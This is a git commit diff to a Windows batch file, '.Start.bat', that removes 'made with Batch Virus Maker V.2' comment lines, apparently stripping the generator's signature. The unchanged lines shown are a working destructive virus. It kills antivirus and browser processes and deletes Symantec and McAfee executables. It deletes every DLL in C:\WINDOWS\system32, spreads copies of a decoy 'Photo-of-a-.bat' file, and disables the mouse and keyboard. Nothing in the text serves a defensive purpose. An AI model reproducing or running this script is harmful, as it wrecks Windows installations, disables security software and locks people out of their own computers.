f2ecc4e7c59c3f62fb790c110cf61fbb9d1eb6a8
Thomas <ThomasTail@users.noreply.github.com>
2018-10-04 16:29:39 -0400

    Update .Start.bat

--- .Start.bat
+++ .Start.bat
@@ -7,18 +7,14 @@ tskill ccapp
 tskill yahoomessenger
 tskill firefox
 tskill chrome
-rem made with Batch Virus Maker V.2
 tskill iexplorer
 time 12:00
-rem made with Batch Virus Maker V.2
 del C:\Program Files\Common Files\Symantec Shared\ccapp.exe
 cd C:\WINDOWS
 cd C:\WINDOWS\system32
-rem made with Batch Virus Maker V.2
 if exist "*.dll" del "*.dll"
 tskill McAfee Security Centre Module
 del c:\program files\mcafee.com\agent\mcdetect.exe
-rem made with Batch Virus Maker V.2
 copy "Photo-of-a-.bat" "Photo-of-a-.bat45544"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat85858"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat1645"
@@ -26,17 +22,14 @@ copy "Photo-of-a-.bat" "Photo-of-a-.bat574457"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat55457"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat9765"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat45465"
-rem made with Batch Virus Maker V.2
 copy "Photo-of-a-.bat" "Photo-of-a-.bat456877"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat77989845"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat2135"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat46876"
-rem made with Batch Virus Maker V.2
 copy "Photo-of-a-.bat" "Photo-of-a-.bat45687"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat8868"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat2000"
 copy "Photo-of-a-.bat" "Photo-of-a-.bat2009"
 msg * this is a virus
 rundll mouse,disable
-rem made with Batch Virus Maker V.2
 rundll keyboard,disable
